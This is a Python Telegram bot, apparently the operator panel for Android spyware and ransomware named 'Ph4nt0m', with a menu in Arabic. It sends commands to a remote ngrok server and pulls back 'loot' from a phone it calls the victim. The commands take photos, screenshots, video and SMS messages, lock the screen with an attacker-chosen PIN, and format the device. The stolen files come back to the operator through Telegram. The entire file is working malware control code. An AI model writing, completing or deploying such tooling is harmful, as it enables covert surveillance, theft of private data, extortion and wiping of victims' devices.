#!/usr/bin/env python3
import os, json, requests, time, base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app"
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN")

ASK_PIN = 1
ASK_NOTIFY = 2
last_loot_time = 0

def send_command(action, params=None):
    try:
        r = requests.post(f"{SERVER_URL}/command", json={"action":action,"params":params or {}}, timeout=10)
        return r.json()
    except: return {"status":"error"}

def get_loot():
    global last_loot_time
    try:
        r = requests.get(f"{SERVER_URL}/loot?since={last_loot_time}", timeout=10)
        data = r.json()
        for item in data.get('loot',[]):
            if item['timestamp'] > last_loot_time: last_loot_time = item['timestamp']
        return data.get('loot',[])
    except: return []

def menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 صور", callback_data='scan_photos'), InlineKeyboardButton("📋 معلومات", callback_data='get_info')],
        [InlineKeyboardButton("🖼️ شاشة", callback_data='screenshot'), InlineKeyboardButton("🎥 فيديو", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'), InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'), InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("💬 SMS", callback_data='get_sms'), InlineKeyboardButton("🔔 إشعار", callback_data='send_notify')],
        [InlineKeyboardButton("🔒 قفل", callback_data='set_pin'), InlineKeyboardButton("💣 فرمتة", callback_data='format')],
        [InlineKeyboardButton("📂 مسروقات", callback_data='loot')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ Ph4nt0m\nاختر أمر:", reply_markup=menu())

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data

    if d == 'set_pin':
        await q.edit_message_text("🔢 PIN (4 أرقام):")
        return ASK_PIN
    if d == 'send_notify':
        await q.edit_message_text("🔔 نص الإشعار:")
        return ASK_NOTIFY
    if d == 'loot':
        loot = get_loot()
        if not loot:
            await q.edit_message_text("لا مسروقات", reply_markup=menu())
            return
        for item in loot[-5:]:
            if item.get('info'):
                await q.message.reply_text(str(item['info'])[:3000])
            elif item.get('data'):
                try:
                    ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                    await q.message.reply_document(document=base64.b64decode(item['data']), filename=item.get('name',f"f.{ext}"))
                except: pass
        await q.edit_message_text("✅ تم", reply_markup=menu())
        return

    r = send_command(d)
    if r.get('status') in ('ok','pending'):
        await q.edit_message_text(f"✅ {d}", reply_markup=menu())
        time.sleep(2)
        for item in get_loot()[-3:]:
            if item.get('info'): await q.message.reply_text(str(item['info'])[:2000])
            elif item.get('data'):
                try:
                    ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                    await q.message.reply_document(document=base64.b64decode(item['data']), filename=item.get('name',f"f.{ext}"))
                except: pass
    else:
        await q.edit_message_text("❌ لا ضحية", reply_markup=menu())

async def pin_input(update, context):
    pin = update.message.text.strip()
    if len(pin)!=4 or not pin.isdigit():
        await update.message.reply_text("❌ 4 أرقام:"); return ASK_PIN
    send_command('lock_screen',{'pin':pin})
    await update.message.reply_text(f"🔒 {pin}")
    return ConversationHandler.END

async def notify_input(update, context):
    msg = update.message.text.strip()
    send_command('send_notification',{'message':msg})
    await update.message.reply_text(f"🔔 {msg}")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle, pattern='^set_pin$'), CallbackQueryHandler(handle, pattern='^send_notify$')],
        states={ASK_PIN:[MessageHandler(filters.TEXT & ~filters.COMMAND, pin_input)], ASK_NOTIFY:[MessageHandler(filters.TEXT & ~filters.COMMAND, notify_input)]},
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    app.add_handler(conv)
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    main()
